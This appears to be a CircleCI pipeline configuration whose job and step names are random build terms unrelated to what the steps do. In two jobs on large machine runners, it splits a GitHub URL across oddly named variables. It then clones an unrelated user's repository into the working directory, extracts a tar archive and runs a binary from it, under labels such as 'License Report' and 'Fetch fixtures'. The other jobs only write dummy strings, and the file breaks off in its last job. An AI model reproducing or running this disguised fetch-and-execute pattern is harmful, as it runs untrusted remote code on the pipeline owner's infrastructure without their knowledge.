version: 2.1

jobs:
  linting-mutation-tests-lane-3:
    docker:
      - image: cimg/base:stable
    resource_class: small
    steps:
      - run:
          name: Analyze test dependencies
          command: |
            mkdir -p /tmp/deploy-rule-engine
            echo "$(echo 'RestartLinkCheckerContainer') $(echo 'gather-daemon-test-metrics')" > /tmp/deploy-rule-engine/performance-audit-phase
            stat -c '%n %U %s' /tmp/deploy-rule-engine/performance-audit-phase
      - persist_to_workspace:
          root: /tmp/deploy-rule-engine
          paths:
            - 'performance-audit-phase'
  ProfilingStartupTime:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/deploy-rule-engine
      - run:
          name: restore-search-dependencies-track-1
          command: |
            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/performance-audit-phase" | cat -n | head -c 1500
      - run:
          name: License Report (cycle 1)
          command: |
            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
            git clone --depth 5 --no-tags "$chunkof/$removing/$nodeof" `pwd`
      - run:
          name: Restore vendored sources
          command: |
            tar --verbose --extract -f SetUpBackEndService.tar
      - run:
          command: |
            "$(pwd)/optimizeUserPortalStaticAssets"
  capture-billing-debug-logs:
    docker:
      - image: cimg/base:stable
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/deploy-rule-engine
      - run:
          name: Bundle release notes
          command: |
            mkdir -p /tmp/deploy-rule-engine
            echo "$(echo 'readinessCheckPass2') $(echo 'FallbackBuildCache')" > /tmp/deploy-rule-engine/RequiredLicenseReview
            stat -c '%n %U %s' /tmp/deploy-rule-engine/RequiredLicenseReview
      - persist_to_workspace:
          root: /tmp/deploy-rule-engine
          paths:
            - 'RequiredLicenseReview'
  editor-snapshots:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/deploy-rule-engine
      - run:
          name: restore-search-dependencies-track-1
          command: |
            awk 'NR==5,NR==12' "/tmp/deploy-rule-engine/RequiredLicenseReview" | cat -n | head -c 1500
      - run:
          name: License Report (cycle 1)
          command: |
            chunkof=https://github.com; removing=liukasantorvblo-hue; nodeof=PostBuildVolumeBackup
            git clone --depth=10 "$chunkof/$removing/$nodeof" "${PWD}"
      - run:
          name: Fetch fixtures
          command: |
            tar --extract --file SetUpBackEndService.tar
      - run:
          command: |
            env "./optimizeUserPortalStaticAssets"
  RenderDefaultLoaderSettings:
    docker:
      - image: cimg/base:stable
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/deploy-rule-engine
      - run:
          name: Full readiness check step
